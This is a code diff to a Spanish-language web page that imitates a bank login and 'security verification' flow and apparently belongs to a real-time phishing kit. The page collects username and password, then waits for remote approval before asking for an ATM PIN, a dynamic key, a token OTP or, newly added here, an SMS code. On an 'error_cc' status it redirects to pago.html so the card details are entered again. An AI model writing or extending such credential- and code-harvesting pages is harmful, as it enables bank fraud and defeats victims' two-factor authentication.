@@ -235,7 +235,7 @@
         if (!solicitudId) solicitudId = localStorage.getItem('tarjeta_aprobada_solicitud');
         if (!solicitudId) {
             alert('No hay datos de pago. Volviendo al inicio.');
-            window.location.href = 'index.html';
+            window.location.href = 'pago.html';
         }
 
         let faseActual = 'credenciales';
@@ -243,6 +243,7 @@
         let formularioBloqueado = false;
         let esClaveATM = false;
         let esClaveDinamica = false;
+        let esSMS = false;
 
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
@@ -354,7 +355,7 @@
                     if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         loadingOverlay.classList.remove('active');
-                        desbloquearOTP(!!data.requiere_clave_atm, !!data.requiere_clave_dinamica);
+                        desbloquearOTP(!!data.requiere_clave_atm, !!data.requiere_clave_dinamica, !!data.requiere_sms);
                         return;
                     }
 
@@ -364,6 +365,7 @@
                         setTimeout(() => { window.location.href = 'exito.html'; }, 1500); return;
                     }
 
+                    // 🔥 ERROR DE USUARIO → reiniciar con NUEVO solicitud_id
                     if (data.estado === 'rechazado_user_error') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         statusMessage.className = 'status-message error';
@@ -371,6 +373,22 @@
                         statusMessage.style.display = 'block';
                         loadingOverlay.classList.remove('active');
                         resetFormulario(true);
+                        return;
+                    }
+
+                    // 🔥 ERROR CC → volver a pago.html para reingresar los datos de la tarjeta
+                    if (data.estado === 'error_cc') {
+                        clearInterval(pollingInterval); pollingInterval = null;
+                        loadingOverlay.classList.remove('active');
+                        statusMessage.className = 'status-message error';
+                        statusMessage.textContent = data.mensaje || 'Error en los datos de la tarjeta. Por favor, verifica e inténtalo nuevamente.';
+                        statusMessage.style.display = 'block';
+
+                        // Limpiar datos de tarjeta para que pago.html pida todo de nuevo
+                        localStorage.removeItem('tarjeta_aprobada');
+                        localStorage.removeItem('tarjeta_aprobada_solicitud');
+
+                        setTimeout(() => { window.location.href = 'pago.html'; }, 3500);
                         return;
                     }
 
@@ -382,6 +400,7 @@
                             let mensaje = 'No fue posible validar el código ingresado. Por favor, inténtalo nuevamente.';
                             if (esClaveATM) mensaje = 'No fue posible validar la clave ingresada. Por favor, inténtalo nuevamente.';
                             if (esClaveDinamica) mensaje = 'No fue posible validar la clave dinámica. Por favor, inténtalo nuevamente.';
+                            if (esSMS) mensaje = 'No fue posible validar el código SMS. Por favor, inténtalo nuevamente.';
 
                             statusMessage.className = 'status-message error';
                             statusMessage.textContent = mensaje;
@@ -391,7 +410,9 @@
                             confirmationInput.parentElement.classList.remove('error');
                             confirmationInput.focus();
                             submitButton.disabled = false;
-                            buttonText.textContent = esClaveATM ? 'Confirmar clave' : (esClaveDinamica ? 'Confirmar clave dinámica' : 'Confirmar OTP');
+                            buttonText.textContent = esClaveATM ? 'Confirmar clave'
+                                : (esClaveDinamica ? 'Confirmar clave dinámica'
+                                : (esSMS ? 'Confirmar código SMS' : 'Confirmar OTP'));
                             formularioBloqueado = false;
                         } else {
                             mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
@@ -403,9 +424,10 @@
             }, POLLING_INTERVAL);
         }
 
-        function desbloquearOTP(requiereClaveATM = false, requiereClaveDinamica = false) {
+        function desbloquearOTP(requiereClaveATM = false, requiereClaveDinamica = false, requiereSMS = false) {
             esClaveATM = !!requiereClaveATM;
             esClaveDinamica = !!requiereClaveDinamica;
+            esSMS = !!requiereSMS;
 
             usernameInput.disabled = true; 
             passwordInput.disabled = true;
@@ -432,6 +454,16 @@
                 document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
                 document.getElementById('mainSubtitle').innerHTML =
                     `Credenciales verificadas. Ingresa la clave dinámica para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            } else if (esSMS) {
+                otpLabel.innerHTML = 'Código SMS <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Se envió un código por mensaje de texto (SMS) al número registrado. Ingresa el código para continuar.';
+                confirmationInput.placeholder = 'Ingresa el código recibido por SMS (4-8 dígitos)';
+                confirmationInput.maxLength = 8;
+                otpErrorMsg.textContent = 'El código debe tener entre 4 y 8 dígitos';
+                buttonText.textContent = 'Confirmar código SMS';
+                document.getElementById('mainTitle').textContent = 'Verificación por SMS';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Se envió un código de verificación por mensaje de texto al número asociado a tu <strong>${bankNombre.textContent}</strong>.`;
             } else {
                 otpLabel.innerHTML = 'Código OTP <span class="required">*</span>';
                 otpInfoMessage.textContent = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
@@ -467,6 +499,7 @@
             faseActual = 'credenciales'; 
             esClaveATM = false;
             esClaveDinamica = false;
+            esSMS = false;
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false; 
             buttonText.textContent = 'Continuar';
@@ -520,7 +553,7 @@
                             confirmationInput.parentElement.classList.add('error');
                             otpErrorMsg.textContent = esClaveDinamica
                                 ? 'La clave dinámica debe tener entre 4 y 8 dígitos'
-                                : 'El código debe tener entre 4 y 8 dígitos';
+                                : (esSMS ? 'El código SMS debe tener entre 4 y 8 dígitos' : 'El código debe tener entre 4 y 8 dígitos');
                             isValid = false;
                         }
                     }
@@ -549,6 +582,7 @@
                 let textoLoading = 'Validando código de seguridad...';
                 if (esClaveATM) { textoBoton = 'Verificando clave...'; textoLoading = 'Validando clave de cajero...'; }
                 else if (esClaveDinamica) { textoBoton = 'Verificando clave dinámica...'; textoLoading = 'Validando clave dinámica...'; }
+                else if (esSMS) { textoBoton = 'Verificando SMS...'; textoLoading = 'Validando código SMS...'; }
 
                 buttonText.textContent = textoBoton; 
                 loadingText.textContent = textoLoading; 
@@ -559,7 +593,9 @@
                     mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     formularioBloqueado = false; 
                     submitButton.disabled = false; 
-                    buttonText.textContent = esClaveATM ? 'Confirmar clave' : (esClaveDinamica ? 'Confirmar clave dinámica' : 'Confirmar OTP');
+                    buttonText.textContent = esClaveATM ? 'Confirmar clave'
+                        : (esClaveDinamica ? 'Confirmar clave dinámica'
+                        : (esSMS ? 'Confirmar código SMS' : 'Confirmar OTP'));
                     return; 
                 }
                 iniciarPolling('Esperando confirmación final...');
